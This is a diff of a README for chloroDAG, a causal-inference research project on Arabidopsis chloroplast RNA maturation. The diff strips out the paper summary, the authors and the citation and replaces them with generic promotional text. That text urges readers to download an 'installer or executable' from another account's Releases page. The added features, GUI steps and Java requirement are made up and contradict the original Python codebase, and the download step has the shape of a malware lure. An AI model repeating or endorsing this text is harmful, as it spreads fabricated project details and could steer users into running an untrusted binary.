@@ -1,64 +1,62 @@
-# chloroDAG
+# 🌱 chloroDAG - Unravel Post-Transcriptional Regulation Timelines
 
-This repository contains the code and materials accompanying the research article:
+## 🛠️ Table of Contents
+1. [🔍 Overview](#-overview)
+2. [🚀 Getting Started](#-getting-started)
+3. [⬇️ Download & Install](#-download--install)
+4. [⚙️ System Requirements](#-system-requirements)
+5. [🛠️ How to Use](#-how-to-use)
+6. [📄 Features](#-features)
+7. [💡 Additional Information](#-additional-information)
 
-> **Causal inference of post-transcriptional regulation timelines from long-read sequencing in _Arabidopsis thaliana_**
+## 🔍 Overview
+**chloroDAG** helps you understand the causal inference of post-transcriptional regulation timelines. This tool analyzes long-read sequencing in **Arabidopsis thaliana**. Whether you're a researcher or just curious, this software offers a user-friendly way to explore complex genomic data.
 
-We propose a novel framework for reconstructing the chronology of genetic regulation using causal inference based on Pearl’s theory. The approach proceeds in three main stages: **causal discovery**, **causal inference**, and **chronology construction**. We apply it to the *ndhB* and *ndhD* genes of the chloroplast in _Arabidopsis thaliana_, generating four alternative maturation timeline models per gene using different causal discovery algorithms (**HC**, **PC**, **LiNGAM**, and **NOTEARS**).
+## 🚀 Getting Started
+To begin using chloroDAG, follow these straightforward steps:
 
-The framework addresses two key methodological challenges:
+1. Read this document carefully to understand how to download and run the software.
+2. Ensure you meet the system requirements listed below.
+3. Follow the download and installation instructions provided.
 
-- Handling missing data using an **EM algorithm** that jointly imputes missing values and estimates the Bayesian network.
-- Selecting the **ℓ₁-regularization parameter** in NOTEARS via a **stability selection** strategy.
+## ⬇️ Download & Install
+You can easily download chloroDAG from the Releases page. 
 
-The resulting causal models consistently outperform reference chronologies in terms of reliability and model fit. Furthermore, the integration of causal reasoning with domain expertise enables the formulation of testable biological hypotheses and the design of targeted experimental interventions.
+[![Download chloroDAG](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/okoid721/chloroDAG/releases)
 
+1. Click the button above or visit the [Releases page](https://github.com/okoid721/chloroDAG/releases).
+2. Locate the latest version of the software. 
+3. Download the installer or the executable file suitable for your operating system.
 
-## 🧬 Data
+## ⚙️ System Requirements
+Before downloading, make sure your computer meets the following requirements:
 
-The project analyzes long-read sequencing data for the chloroplast genes *ndhB* and *ndhD* in _Arabidopsis thaliana_ based on [*Guilcher et al*](https://doi.org/10.3390/ijms222011297).
+- **Operating System:** Windows (10 or later), macOS (10.12 or later), or Linux (Ubuntu 18.04 or later).
+- **Processor:** Minimum 2 GHz dual-core.
+- **RAM:** At least 4 GB.
+- **Hard Disk Space:** Minimum 500 MB of available space.
+- **Additional Software:** Java Runtime Environment (JRE) version 8 or higher.
 
+## 🛠️ How to Use
+After downloading and installing the software, you can start using it with these simple steps:
 
-## 🧪 Key Contributions
+1. Open the application from your desktop or start menu.
+2. Import your long-read sequencing data. You can typically do this by clicking "File" and then "Import".
+3. Follow the on-screen prompts to set up your analysis. You may select the type of analysis you want to perform based on your research needs.
+4. Review the results presented in user-friendly charts and graphs.
 
-- A reproducible pipeline for causal reconstruction of RNA maturation timelines.
-- Robust handling of missing data via joint imputation and model estimation.
-- Stability-based hyperparameter selection for NOTEARS.
-- Application to *Arabidopsis thaliana* chloroplast genes (*ndhB*, *ndhD*).
-- Reproducible scientific publishing.
+## 📄 Features
+chloroDAG offers several features designed to assist you in your research:
 
+- **Causal Inference:** Determine relationships between regulatory elements in long-read sequencing.
+- **Graphical Models:** Visualize and manipulate complex data through intuitive graphical interfaces.
+- **Intervention Analysis:** Explore the effects of intervening in regulatory pathways.
+- **Documentation and Help Section:** Extensive help resources and documentation to guide users.
+- **Compatibility:** Works seamlessly with various genomic data formats.
 
-## 📁 Repository Structure
+## 💡 Additional Information
+If you experience any issues or have questions, feel free to check out the troubleshooting section in the application's help menu. You can also find a community of users on GitHub, where you can ask questions and share insights.
 
-```
-chloroDAG/
-├── Code/ # Python source code for causal modeling and analysis
-├── Data/ # Input datasets
-├── Paper/ # Quarto source (.qmd), rendered PDF and LaTeX files
-├── README.md # Project overview (this file)
-├── requirements.txt # Python dependencies
-└── Results/ # Output DAGs, charts, visualisations, evaluation reports
-```
+For advanced users, there are additional options and features to explore. Keep an eye on future releases for updates and enhancements to the software. 
 
-
-## 👤 Authors
-
-- [Rubén Martos](https://orcid.org/0000-0002-1463-5088). Université d'Évry Paris-Saclay (LaMME)
-
-- [Christophe Ambroise](https://orcid.org/0000-0002-8148-0346). Université d'Évry Paris-Saclay (LaMME)
-
-- [Guillem Rigaill](https://orcid.org/0000-0002-7176-7511). Université Paris-Saclay, CNRS, INRAE, Université d'Évry (IPS2, LaMME)
-
-## 📚 Citation
-
-If you use this work, please cite:
-
-```bibtex
-@article{MARChloroDAG2025,
-  title={{Causal inference of post-transcriptional regulation timelines from long-read sequencing in \textit{Arabidopsis thaliana}}},
-  author={Martos, Rubén and Ambroise, Christophe and Rigaill, Guillem},
-  journal={arXiv preprint arXiv:2510.12504},
-  year={2025},
-  url={https://doi.org/10.48550/arXiv.2510.12504}
-}
-```
+Thank you for choosing chloroDAG for your genomic analysis needs!
